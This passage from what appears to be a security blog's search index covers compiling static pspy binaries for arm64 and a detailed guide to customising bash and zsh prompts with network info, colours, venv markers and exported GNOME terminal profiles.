systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p> <p>The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.</p> <ul> <li>github.com/DominicBreuker/pspy</li> <li>kali.org/tools/pspy</li> <li>gitlab.com/kalilinux/pspy</li> </ul> <p>Go uses go.mod to version-pin dependencies. The go.sum file is the cryptographic signature of each dependency, which is also mirrored in a global signature database hosted by Google. This should help with understanding how dependencies can be verified.</p> <p>The build instructions in the README don't seem to be current, as there is no <code>build-buid-image</code> in the Makefile. Instead, line 44 is what builds the \"build\" container, and it's commented out. We can change the variables to work with bash, and create the build container:</p> <pre><code># Clone the Kali fork, or the upstream source on GitHub if you prefer\ngit clone git@github.com:DominicBreuker/pspy.git pspy-github\ngit clone git@gitlab.com:kalilinux/packages/pspy.git pspy-gitlab\ncd pspy-gitlab/\n\n# Build the build image, you have to run this manually, it's commented out in the Makefile\nBUILD_IMAGE='local/pspy-build:latest'\nBUILD_DOCKERFILE=\"docker/Dockerfile.build\"\ndocker build -f \"$BUILD_DOCKERFILE\" -t \"$BUILD_IMAGE\" .\n\n# Build all 4 binaries\nmake build\n</code></pre> <p>Now if we want to build binaries to work on arm, it's very easy to do so by duplicating one of the build sections, and setting <code>GOARCH=arm64</code> or <code>GOARM=5 GOARCH=arm</code>.</p> <p>Go and ARM</p> <p>https://go.dev/wiki/GoArm</p> <p>Go is fully supported on Linux and Darwin. Any Go program that you can compile for x86/x86_64 should work on Arm. Besides Linux and Darwin, Go is also experimentally supported on FreeBSD, OpenBSD and NetBSD.</p> <p>With that in mind, here's a section that was copied to swap out amd64 for arm64, while also renaming the output file to <code>bin/pspy64a</code>:</p> <pre><code>docker run -it \\\n            --rm \\\n            -v $(PROJECT_DIR):/go/src/github.com/dominicbreuker/pspy \\\n            -w \"/go/src/github.com/dominicbreuker/pspy\" \\\n            --env CGO_ENABLED=0 \\\n            --env GOOS=linux \\\n            --env GOARCH=arm64 \\\n            $(BUILD_IMAGE) /bin/sh -c \"go build -a -ldflags '-s -w -X main.version=${VERSION} -X main.commit=${BUILD_SHA} -extldflags \\\"-static\\\"' -o bin/pspy64a main.go\"\n</code></pre> <p>Add this to the Makefile, and run <code>make build</code> to compile a static arm64 binary in addition to the others.</p> <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#yara","title":"yara","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2025/06/15/fontawesome-solid-square-binary-compile-static-binaries/#busybox","title":"busybox","text":"<p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/","title":"Custom Shell Profiles","text":"<p>Working with and customizing shell profiles.</p> <p>How did this start?</p> <p>The examples below are essentially replicating what's displayed in the TrustedSec blog post, in a way that looks like the Kali <code>zsh</code>. The gist by Carlos Polop has examples for more advanced things you can do such as displaying current CPU, RAM and disk usage in the prompt.</p> <p>This file is originally from straysheep-dev/linux-configs.</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#references","title":"References","text":"<p>This post draws heavily from the following references:</p> <ul> <li>GNU Bash Manual: Shell Variables</li> <li>GNU Bash Manual: Controlling the Prompt String</li> <li>Kali Linux Blog: Shell Prompt Change</li> <li>TrustedSec: Shell Improvements for Pentesters</li> <li>ohmyzsh: Themes</li> <li>github.com/carlospolop: Shell Prompt Gist</li> <li>Stack Overflow: Shell Prompt with Datetime</li> <li>Super User: Display IP in Shell Prompt</li> <li>Stack Exchange: Print Last Element of Each Row</li> <li>Arch Linux Wiki: GNOME Configuration</li> <li>Arch Linux Wiki: Prompt Customization</li> <li>Ask Ubuntu: Backup GNOME Terminal Settings</li> <li>Stack Exchange: How the Escape <code>\\</code> Character Works in Bash</li> <li>Stack Overflow: How Do I Change the <code>virtualenv</code> Prompt?</li> </ul> <p>Additional resources that are useful here:</p> <ul> <li>TCM-SEC Academy: Linux 101</li> <li>Antisyphon Training: Regular Expressions with Joff Thyer</li> </ul>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#prompt-string","title":"Prompt String","text":"<p>Use your shell prompt to track your user, hostname, tty, the date/time, interface information, and working directory.</p> <pre><code>\u250c\u2500\u2500[user@fedora:1]-[2024-05-13\u202215:45:11]-[eth0:10.55.55.28/24]-[/tmp]\n\u2514\u2500$\n</code></pre> <p>The following sections detail how to do this with your shell prompt.</p> <p>Bash Documentation</p> <p>There are a number of built-in escape characters and modifiers for <code>bash</code> that you can start with. Be sure to check those first. These are also discussed below in the bash section.</p> <ul> <li>GNU Bash Manual: Shell Variables</li> <li>GNU Bash Manual: Controlling the Prompt String</li> </ul>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#network-information","title":"Network Information","text":"<p>Using <code>ip</code> and <code>awk</code> in functions, networking interface information can be obtained dynamically per system.</p> <ul> <li>GNU awk: Comparison Operators</li> <li>GNU awk: Exit Statement</li> <li>GNU awk: Using BEGIN and END</li> <li>GNU awk: Referencing Elements</li> <li>IBM: awk BEGIN and END Patterns</li> <li>StackExchange: Print IP Address with Interface</li> <li>StackExchange: Print all Elements of an Array in awk</li> <li>StackExchange: Print Array Contents on Same Line with awk</li> </ul> <p>You'll need <code>awk</code> to consider the entire input when processing data. Nested \"if\" statements in <code>awk</code> do not work as expected because data is processed line by line. Printing the input that <code>awk</code> is being fed with <code>print $0</code> will illustrate what <code>awk</code> is seeing and in what order. Basically each line is processed against an entire block of conditionals. This is different than how bash processes input, where the entire input could be considered a single string, where it's all processed at once.</p> <p>For example: Even if a higher priority match for an if statement exists in the input, unless it appears on an earlier line than a lower priority match, it will never be matched.</p> <pre><code>ip link show | awk -F ': ' '{\n    if ($2 ~ /tun|tap|wg[0-9]/) {\n        print $2\n        exit\n    } else if ($2 ~ /eth|en/) {\n        print $2\n        exit\n    }\n}'\n</code></pre> <ul> <li>Assume both <code>eth0</code> and <code>tun0</code> exist in the output of <code>ip link show</code>.</li> <li>This <code>awk</code> code will always print eth0 because it appears earlier than <code>tun0</code> in the output of <code>ip link show</code></li> <li>Unintuitively this means it will match on the second condition, because <code>tun0</code> hasn't been read yet</li> <li>So <code>tun0</code> will never be printed</li> <li><code>ip link show | sort -r | ...</code> will successfully print <code>tun0</code>, proving how <code>awk</code> processes data</li> </ul> <p>Processing Data in awk with the END Pattern</p> <p>The shortest way to do this appears to be creating an array of interfaces, and separating interfaces of the same prefix with a space. This gives us our list of interfaces, and the array assignment allows us to control priority, so we'll match first on <code>tunX/tapX</code>, then <code>wgX</code>, <code>enxX</code>, <code>ethX</code> and finally <code>wlan0</code> type interfaces.</p> <p>NOTE: Appending a final pipe to <code>| awk '{print $1}')</code> would ensure that in cases of multiple <code>ethX</code> interfaces, only the first is printed. This is otherwise handled by the commented out <code>#return</code> line in the <code>get_net_info()</code> function.</p> <pre><code>interface_list=$(ip link show | awk -F ': ' '{\n    if ($0 !~ /state DOWN/ &amp;&amp; $2 ~ /[a-z]+[0-9]/) {\n        interfaces[NR] = $2\n    }\n}\nEND{\n    for(i in interfaces){\n        if (interfaces[i] ~ /^tun|^tap/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^wg[0-9]/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^en/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^eth/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^wl[a-z]+[0-9]$|^ath[0-9]/) {\n            printf interfaces[i] \" \"\n        }\n    }\n}')\n</code></pre> <p>Function to get the interface information:</p> <pre><code>get_net_info() {\n    # Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)\n    #for interface in eth0; do\n    for interface in $(echo $interface_list); do\n        # The `NR==1{&lt;SNIP&gt;; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs\n        # http://stackoverflow.com/questions/22190902/ddg#22190928\n        IFACE_NAME=$(ip addr show dev \"$interface\" 2&gt;/dev/null | grep -P \"inet\\s.+$interface$\" | awk 'NR==1{print $NF; exit}')\n        IFACE_ADDR=$(ip addr show dev \"$interface\" 2&gt;/dev/null | grep -P \"inet\\s.+$interface$\" | awk 'NR==1{print $2; exit}')\n        if [[ -n \"${IFACE_NAME}\" ]] &amp;&amp; [[ -n \"${IFACE_ADDR}\" ]]; then\n            # The \"${NC}:${YELLOW}\" is being passed to and interpretted by this script in your shell, it resets the color of the `:` symbol\n            # using the ANSI colors defined above.\n            echo \"${IFACE_NAME}${NC}:${YELLOW}${IFACE_ADDR}\"\n            return\n        fi\n    done\n}\n</code></pre>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#ansi-colors","title":"ANSI Colors","text":"<p>The prompt string itself is plain text here, with no color, but your terminal and all of its commands will still be in full color if color printing is supported. Adding color and additional formatting to the prompt string will require some form of using ANSI escape codes.</p> <p>The easiest way to demonstrate this is with the linpeas color variables, as they're clear to read instead of raw ANSI escape codes. The <code>SED_</code> variables are not necessary here, so they can be omitted.</p> <p>Write them at the top of your custom file like this:</p> <pre><code>#!/bin/bash\n\n&lt;SNIP&gt;\n\n# Colors and color printing code taken directly from:\n# https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh\nC=$(printf '\\033')\nRED=\"${C}[1;31m\"\nGREEN=\"${C}[1;32m\"\nYELLOW=\"${C}[1;33m\"\nRED_YELLOW=\"${C}[1;31;103m\"\nBLUE=\"${C}[1;34m\"\nITALIC_BLUE=\"${C}[1;34m${C}[3m\"\nLIGHT_MAGENTA=\"${C}[1;95m\"\nLIGHT_CYAN=\"${C}[1;96m\"\nLG=\"${C}[1;37m\" #LightGray\nDG=\"${C}[1;90m\" #DarkGray\nNC=\"${C}[0m\"\nUNDERLINED=\"${C}[5m\"\nITALIC=\"${C}[3m\"\n\n&lt;SNIP&gt;\n</code></pre> <p>To change a section to be green, write <code>${GREEN}</code> ahead of the text you wish to change, and <code>${NC}</code> (meaning no color) directly behind the text.</p> <ul> <li><code>${GREEN}</code> changes all subsequent text to green</li> <li><code>${NC}</code> returns all subsequent text back to plain text</li> </ul> <p>In this example the date string, and time string, will be green, but the dot <code>\u2022</code> that separates them will not.</p> <pre><code># Example snippet\n&lt;SNIP&gt;-(${GREEN}\\D{%Y-%m-%d}${NC}\u2022${GREEN}\\t${NC})-&lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#bash","title":"bash","text":"<p><code>bash</code> is universally available on Linux. Certain escape sequences have unique behavior in bash prompts. These escape characters work the same in bash across different platforms, especially when using a custom shell profile to override any unique changes the OS makes to the shell prompt.</p> <p>Prompt Customization Guides</p> <ul> <li>GNU Bash Manual: Controlling the Prompt String</li> <li>Arch Linux Wiki: Prompt Customization</li> <li>Stack Exchange: How the Escape <code>\\</code> Character Works in Bash</li> </ul> <pre><code># Example Ubuntu `bash` prompt:\n\u250c\u2500\u2500[ubuntu@ubuntu2204:2]-(2024-05-13\u202222:26:15)-(eth0:172.16.1.14/24)-[/tmp]\n\u2514\u2500$\n</code></pre> <ul> <li><code>\\D{%Y-%m-%d}</code>: Displays the date based on the format within curly brackets</li> <li><code>\\t</code>: Displays the time as <code>hh:mm:ss</code></li> <li><code>\\l</code>: Shows your current TTY</li> <li><code>\\$(&lt;cmd&gt;)</code>: Will cause any command or function to execute each time the <code>PS1</code> string is printed</li> </ul> <p>Escaping commands with <code>\\$(&lt;cmd&gt;)</code></p> <p>If you don't escape embedded commands, any command substituation done in your shell will only excute once, when the shell loads, instead of (what you likely are intending) which is to update the prompt string every time you press enter.</p> <p>Modify .bashrc (difficult)</p> <p>If you'd like to try to insert this into your existing <code>PS1</code> variable:</p> <ul> <li>You'll need to figure out how this fits into your current <code>PS1</code> string</li> <li>Don't forget to also insert the <code>get_net_info()</code> function somewhere above the <code>PS1</code> variable</li> <li>Harder to maintain</li> </ul> <pre><code># Just date/time, net info\n&lt;SNIP&gt;:\\l]-(\\D{%Y-%m-%d}\u2022\\t)-(\\$(get_net_info))-&lt;SNIP&gt;\n</code></pre> <p>Custom Dotfile (recommended)</p> <p>Or to replace your <code>PS1</code> variable in a separate dot file (e.g. <code>~/.custom_shell.sh</code>):</p> <ul> <li>You'll lose any special changes or settings your default <code>.bashrc</code> prompt string provides</li> <li>Add a line at the end of your <code>.bashrc</code> to source this file and use it</li> <li>Easier to maintain</li> </ul> <pre><code>&lt;SNIP&gt;\n    # Entire variable\n    PS1=\"\u250c\u2500\u2500[\\u@\\h:\\l]-(\\D{%Y-%m-%d}\u2022\\t)-(\\$(get_net_info))-[\\w]\\n\u2514\u2500\\\\$ \"\n&lt;SNIP&gt;\n</code></pre> <p>Shell variables exist in bash that can be used to customize these settings further. One of the most useful variables is <code>PROMPT_DIRTRIM</code>.</p> <p><code>PROMPT_DIRTRIM</code></p> <p>If set to a number greater than zero, the value is used as the number of trailing directory components to retain when expanding the \\w and \\W prompt string escapes (see Controlling the Prompt). Characters removed are replaced with an ellipsis.</p> <p>Example: <code>export PROMPT_DIRTRIM=2</code></p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#zsh-kali","title":"zsh (Kali)","text":"<p>Both <code>zsh</code> and <code>bash</code> are customized in Kali, making editing them a different process.</p> <p>For <code>zsh</code> customization, you may want to look at ohmyzsh, which is an entire framework for managing your <code>zsh</code> configuration.</p> <p>For basic modifications, you can run <code>kali-tweaks</code> from any shell, which is a menu to customize the system. <code>Shell &amp; Prompt</code> are one of the options, these allow you to enable preset cusomizations to the shell prompt.</p> <p>Example Kali <code>zsh</code> prompt:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[tun0:10.10.20.151/24]-[2024-04-10\u202211:22:33]-[~/Documents]\n\u2514\u2500$\n</code></pre> <p>These pieces create the above <code>.zshrc</code> prompt string:</p> <ul> <li>The <code>%b%F{%(#.magent.magenta)}</code> strings are where you can modify colors</li> <li>In Kali's <code>.zshrc</code> file, some color terminology is listed below in the <code>ZSH_HIGHLIGHT_STYLES</code> variables</li> <li>The <code>get_net_info()</code> function is written just above <code>configure_prompt()</code> in Kail's <code>.zshrc</code>, it obtains the IP information based on available interfaces</li> <li><code>20%D</code> in <code>zsh</code> prints <code>20YY</code> where <code>%D</code> is two digits (instead of YY) for the current year</li> <li><code>%*</code> in <code>zsh</code> prints the current time as <code>hh:mm:ss</code>, this expression is separated from the next by single quotes plus the <code>$</code> sign like this: <code>%*'$'&lt;next-expression...&gt;</code></li> <li>The values update automatically each time you press enter</li> </ul> <p>NOTE: Your function or command substitution needs to be within a string enclosed by one of the single quotes <code>'</code> to be called every time you press enter. This is easy to misunderstand, as normally <code>bash</code> requires double quotes to interpret anything within quoted strings. Thanks to user gubarz in the HackTheBox Discord for pointing this out.</p> <p>Kali prompt string example:</p> <ul> <li>https://www.shellcheck.net/wiki/SC2155</li> </ul> <pre><code>&lt;SNIP&gt;\nget_net_info() {\n&lt;SNIP&gt;\n\nPROMPT=$'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))\u2500}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%b%F{%(#.magenta.magenta)}$(get_net_info)%b%F{%(#.blue.green)}]-[%b%F{%(#.yellow.yellow)}20%D%b%F{%(#.blue.green)}\u2022%b%F{%(#.yellow.yellow)}%*'$'%b%F{%(#.blue.green)}]-[%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}]\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '\n&lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#controlling-venv","title":"Controlling (venv)","text":"<p>You can modify where and how the virtual environment string gets added to your shell (specifically for python in this case, but the same idea applies to other shell modifiers).</p> <p>If you review the <code>.../bin/activate</code> file of a python virtual environment, you'll see how it works, and how you can modify its behavior.</p> <p>Python Virtual Environment Dotfile Snippet</p> <pre><code># SNIP\n\nVIRTUAL_ENV=/home/user1/venv\nexport VIRTUAL_ENV\n\n_OLD_VIRTUAL_PATH=\"$PATH\"\nPATH=\"$VIRTUAL_ENV/\"bin\":$PATH\"\nexport PATH\n\n# unset PYTHONHOME if set\n# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)\n# could use `if (set -u; : $PYTHONHOME) ;` in bash\nif [ -n \"${PYTHONHOME:-}\" ] ; then\n    _OLD_VIRTUAL_PYTHONHOME=\"${PYTHONHOME:-}\"\n    unset PYTHONHOME\nfi\n\nif [ -z \"${VIRTUAL_ENV_DISABLE_PROMPT:-}\" ] ; then\n    _OLD_VIRTUAL_PS1=\"${PS1:-}\"\n    PS1='(venv) '\"${PS1:-}\"\n    export PS1\n    VIRTUAL_ENV_PROMPT='(venv) '\n    export VIRTUAL_ENV_PROMPT\nfi\n\n# SNIP\n</code></pre> <p>That <code>VIRTUAL_ENV_DISABLE_PROMPT</code> is a variable we can set so we can handle how and where the <code>(venv)</code> string gets added to our prompt.</p> <p>Here's how we can achieve this:</p> <pre><code># This will add (venv) to the front of the prompt anytime it's activated\n# SNIP\n\nexport VIRTUAL_ENV_DISABLE_PROMPT=1\n\nvenv_prompt() {\n    # This is for modifying python virtual evnrionments\n    if [[ -n \"${VIRTUAL_ENV}\" ]]; then\n        echo \"(venv) \"\n    fi\n}\n\nPS1=\" ... \\\\$ \\$(venv_prompt)\"\n\n# SNIP\n</code></pre> <p>Here's what this could look like, if for instance you have a multiline shell prompt:</p> <pre><code>\u250c\u2500\u2500[user@fedora:1] \u2022 (/tmp])\n\u2514\u2500$ (venv)\n</code></pre>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#making-the-changes","title":"Making the Changes","text":"<p>Putting the above network functions, color variables, and shell escape characters together into a shell profile can be accomplished with minimal mess by writing all of these modifications to a single file, and dot sourcing it. This is ideal over trying to manually edit the <code>~/.bashrc</code> or shell profiles that ship with your OS, as the code there can be unreadable and hard to work with if you're not familiar with how <code>bash</code> or <code>zsh</code> work.</p> <p>For example, take the following code block containing our shell modifications:</p> <pre><code>#!/bin/bash\n\n# GPL-3.0-or-later\n\n# shellcheck disable=SC2034\n# shellcheck disable=SC2116\n# shellcheck disable=SC2086\n\n# References:\n# - [GNU Bash Manual: Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables-1)\n# - [GNU Bash Manual: Controlling the Prompt String](https://www.gnu.org/software/bash/manual/bash.html#Controlling-the-Prompt-1)\n# - [Kali Linux Blog: Shell Prompt Change](https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes)\n# - [TrustedSec: Shell Improvements for Pentesters](https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/)\n# - [ohmyzsh: Themes](https://github.com/ohmyzsh/ohmyzsh/wiki/Themes)\n# - [github.com/carlospolop: Shell Prompt Gist](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)\n# - [Stack Overflow: Shell Prompt with Datetime](https://stackoverflow.com/questions/61335641/bash-or-z-shell-terminal-prompt-with-time-and-date)\n# - [Super User: Display IP in Shell Prompt](https://superuser.com/questions/668174/how-can-you-display-host-ip-address-in-bash-prompt)\n# - [Stack Exchange: Print Last Element of Each Row](https://unix.stackexchange.com/questions/145672/print-last-element-of-each-row)\n# - [Arch Linux Wiki: GNOME Configuration](https://wiki.archlinux.org/title/GNOME#Configuration)\n# - [Arch Linux Wiki: Prompt Customization](https://wiki.archlinux.org/title/Bash/Prompt_customization#Embedding_commands)\n# - [Ask Ubuntu: Backup GNOME Terminal Settings](https://askubuntu.com/questions/967517/how-to-backup-gnome-terminal-emulator-settings)\n# - [Stack Exchange: How the Escape `\\` Character Works in Bash](https://unix.stackexchange.com/questions/611419/how-does-the-escape-character-work-in-bash-prompt)\n# - [Stack Overflow: How Do I Change the `virtualenv` Prompt?](https://stackoverflow.com/questions/10406926/how-do-i-change-the-default-virtualenv-prompt)\n# - [TCM-SEC Academy: Linux 101](https://academy.tcm-sec.com/p/linux-101)\n# - [Antisyphon Training: Regular Expressions with Joff Thyer](https://www.antisyphontraining.com/regular-expressions-your-new-lifestyle-w-joff-thyer/)\n\n# Colors and color printing code taken directly from:\n# https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh\nC=$(printf '\\033')\nRED=\"${C}[1;31m\"\nGREEN=\"${C}[1;32m\"\nYELLOW=\"${C}[1;33m\"\nRED_YELLOW=\"${C}[1;31;103m\"\nBLUE=\"${C}[1;34m\"\nITALIC_BLUE=\"${C}[1;34m${C}[3m\"\nLIGHT_MAGENTA=\"${C}[1;95m\"\nLIGHT_CYAN=\"${C}[1;96m\"\nLG=\"${C}[1;37m\" #LightGray\nDG=\"${C}[1;90m\" #DarkGray\nNC=\"${C}[0m\"\nUNDERLINED=\"${C}[5m\"\nITALIC=\"${C}[3m\"\n\n# Shell variables\nexport PROMPT_DIRTRIM=1\nexport VIRTUAL_ENV_DISABLE_PROMPT=1\n\ninterface_list=$(ip link show | awk -F ': ' '{\n    if ($0 !~ /state DOWN/ &amp;&amp; $2 ~ /[a-z]+[0-9]/) {\n        interfaces[NR] = $2\n    }\n}\nEND{\n    for(i in interfaces){\n        if (interfaces[i] ~ /^tun|^tap/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^wg[0-9]/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^en/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^eth/) {\n            printf interfaces[i] \" \"\n        } else if (interfaces[i] ~ /^wl[a-z0-9]+$|^ath[0-9]/) {\n            printf interfaces[i] \" \"\n        }\n    }\n}')\n\nget_net_info() {\n    # Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)\n    #for interface in eth0; do\n    for interface in $(echo $interface_list); do\n        # The `NR==1{&lt;SNIP&gt;; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs\n        # http://stackoverflow.com/questions/22190902/ddg#22190928\n        IFACE_NAME=$(ip addr show dev \"$interface\" 2&gt;/dev/null | grep -P \"inet\\s.+$interface$\" | awk 'NR==1{print $NF; exit}')\n        IFACE_ADDR=$(ip addr show dev \"$interface\" 2&gt;/dev/null | grep -P \"inet\\s.+$interface$\" | awk 'NR==1{print $2; exit}')\n        if [[ -n \"${IFACE_NAME}\" ]] &amp;&amp; [[ -n \"${IFACE_ADDR}\" ]]; then\n            # The \"${NC}:${YELLOW}\" is being passed to and interpretted by this script in your shell, it resets the color of the `:` symbol\n            # using the ANSI colors defined above.\n            echo \"${IFACE_NAME}${NC}:${YELLOW}${IFACE_ADDR}\"\n            return\n        fi\n    done\n}\n\nget_timezone() {\n    # This will get the timezone set such as \"UTC\" for use in the PS1 string\n    date | awk '{print $6}'\n}\n\nvenv_prompt() {\n    # This is for modifying python virtual evnrionments\n    if [[ -n \"${VIRTUAL_ENV}\" ]]; then\n        echo \"(venv) \"\n    fi\n}\n\n# Plain text prompt string\n#if [ \"$PS1\" ]; then\n#    PS1=\"\u250c\u2500\u2500[\\u@\\h:\\l]-[\\D{%Y-%m-%d}\u2022\\t]-[\\$(get_net_info)]-[ \\W]\\n\u2514\u2500\\\\$ \"\n#fi\n\n# Color prompt string using brackets\n#if [ \"$PS1\" ]; then\n#    PS1=\"\u250c\u2500\u2500[${GREEN}\\u${NC}@${GREEN}\\h${NC}:${LIGHT_MAGENTA}\\l${NC}]-[${LIGHT_CYAN}\\D{%Y-%m-%d}${NC}\u2022${LIGHT_CYAN}\\t${NC}]-[${YELLOW}\\$(get_net_info)${NC}]-[${GREEN}\\w${NC}]\\n\u2514\u2500\\\\$ \"\n#fi\n\n# Color prompt string without brackets\nif [ \"$PS1\" ]; then\n    PS1=\"\u250c\u2500\u2500/${GREEN}\\u${NC}@${GREEN}\\h${NC}:${LIGHT_MAGENTA}\\l${NC}/ ${LIGHT_CYAN}\\D{%Y%m%d%H%M%S}${NC}\\$(get_timezone) ${YELLOW}\\$(get_net_info)${NC} (${GREEN}\\w${NC})\\n\u2514\u2500\\\\$ \\$(venv_prompt)\"\nfi\n</code></pre> <p>Write all of it to one of the following paths:</p> <ul> <li><code>/etc/profile.d/custom_shell.sh</code></li> <li><code>~/.custom_shell.sh</code></li> </ul> <p>Ensure it's being dot sourced by your <code>~/.bashrc</code> file. For example, on Fedora, just writing the modifications to <code>/etc/profile.d/custom_shell.sh</code> and opening a new shell session is enough. On Ubuntu, add the following line to your <code>~/.bashrc</code>:</p> <pre><code>if [[ -f ~/.custom_shell.sh ]]; then\n    . ~/.custom_shell.sh\nfi\n</code></pre> <p>This will source that file, loading it into your shell. The above example effectively overwrites your default <code>PS1</code> shell prompt variable.</p>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#testing-changes","title":"Testing Changes","text":"<p>Modifying your shell can completely break your system. It's important to test anything in a sandbox, VM, or temporary cloud environment. The following steps make it easy to recover should anything go wrong. This way you aren't repeatedly restoring snapshots or reprovisioning your VM.</p> <ul> <li>Always have two sessions open</li> <li>Backup any files you're modifying <code>cp ~/.bashrc ~/.bashrc.bkup</code></li> <li>One session stays open and never loads the modifications into its shell</li> <li>One session is used to dot source or load changes and test them out</li> <li>If anything breaks, kill the broken session and undo the breaking changes with your functioning session</li> </ul>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#aliases","title":"Aliases","text":"<p>It's also worth including some examples for aliases. Use these for sets of commands you execute regularly:</p> <pre><code># custom aliases\nalias c='clear'\nalias dualshark='wireshark&amp; wireshark&amp;'\n</code></pre>"},{"location":"blog/2024/05/29/octicons-terminal-16-custom-shell-profiles/#export-and-import-shell-profiles-gnome","title":"Export and Import Shell Profiles (GNOME)","text":"<p>On GNOME you can use <code>gsettings</code> and <code>dconf</code> to enumerate your terminal settings. This is useful when you customize your shell settings or want to apply profiles to other machines in a repeatable way. This isn't limited to terminal settings either, it's an effective way to backup and restore GNOME system configurations in general.</p> <ul> <li>Arch Linux Wiki: GNOME Configuration</li> <li>Ask Ubuntu: Backup GNOME Terminal Settings</li> </ul> <p><code>dconf</code> vs <code>gsettings</code></p> <p><code>dconf</code> is the ideal way to manage applying settings system-wide through automation. However, some settings are only readable through <code>gsettings</code>, meaning you'll need to enumerate them there, then translate them to be in a format to work with <code>dconf</code>. This is tricky at first but becomes easier to do over time.</p> <p>The GNOME terminal settings seem to be split into two pieces; the settings themselves for each profile, and the actual list of profile ID's that makes them populate your settings tab in the GUI. Here is where <code>dconf</code> is unable to \"see\" the lists by default in most cases, but <code>gsettings</code> can.</p> <p>First, obtain the current profiles in your shell settings:</p> <pre><code># Tab complete this to reveal \"list\" and \"default\" as the only keys\n$ gsettings get org.gnome.Terminal.ProfilesList\ndefault  list\n\n# Dump both, you may end up with something like this\ngsettings get org.gnome.Terminal.ProfilesList list\n['b1dcc9dd-5262-4d8d-a863-c897e6d979b9']\ngsettings get org.gnome.Terminal.ProfilesList default\n'b1dcc9dd-5262-4d8d-a863-c897e6d979b9'\n</code></pre> <p>Next, create the backup file of all terminal settings:</p> <pre><code>dconf dump /org/gnome/terminal/ &gt; gnome-terminal-settings.dconf\n</code></pre> <p>You may end up with something like this:</p> <pre><code>[legacy/profiles:/:b1dcc9dd-5262-4d8d-a863-c897e6d979b9]\nbackground-color='rgb(0,0,0)'\nforeground-color='rgb(0,255,0)'\npalette=['rgb(23,20,33)', 'rgb(192,28,40)', 'rgb(38,162,105)', 'rgb(162,115,76)', 'rgb(18,72,139)', 'rgb(163,71,186)', 'rgb(42,161,179)', 'rgb(208,207,204)', 'rgb(94,92,100)', 'rgb(246,97,81)', 'rgb(51,209,122)', 'rgb(233,173,12)', 'rgb(42,123,222)', 'rgb(192,97,203)', 'rgb(51,199,222)', 'rgb(255,255,255)']\nuse-theme-colors=false\nuse-theme-transparency=false\n\n[legacy/profiles:/:2da83008-7288-437f-ab56-0e6052283371]\nbackground-color='rgb(46,52,54)'\nforeground-color='rgb(211,215,207)'\npalette=['rgb(23,20,33)', 'rgb(192,28,40)', 'rgb(38,162,105)', 'rgb(162,115,76)', 'rgb(18,72,139)', 'rgb(163,71,186)', 'rgb(42,161,179)', 'rgb(208,207,204)', 'rgb(94,92,100)', 'rgb(246,97,81)', 'rgb(51,209,122)', 'rgb(233,173,12)', 'rgb(42,123,222)', 'rgb(192,97,203)', 'rgb(51,199,222)', 'rgb(255,255,255)']\nuse-theme-colors=false\nuse-theme-transparency=false\nvisible-name='My Custom Profile'\n</code></pre> <p>What's missing are the two keys we obtained using <code>gsettings</code> for the profile list and which profile is set to be the default.</p> <p><code>dconf-editor</code></p> <p>You can also find these paths using <code>dconf-editor</code> on Ubuntu, which will note anything that's been changed from its default value.</p> <p>Whether you used <code>dconf-editor</code> or wrote this manually based on the <code>gsettings</code> output, here's what a full block would look like:</p> <pre><code>[legacy/profiles:]\ndefault='b1dcc9dd-5262-4d8d-a863-c897e6d979b9'\nlist=['b1dcc9dd-5262-4d8d-a863-c897e6d979b9', '2da83008-7288-437f-ab56-0e6052283371']\n\n[legacy/profiles:/:b1dcc9dd-5262-4d8d-a863-c897e6d979b9]\nbackground-color='rgb(0,0,0)'\nforeground-color='rgb(0,255,0)'\npalette=['rgb(23,20,33)', 'rgb(192,28,40)', 'rgb(38,162,105)', 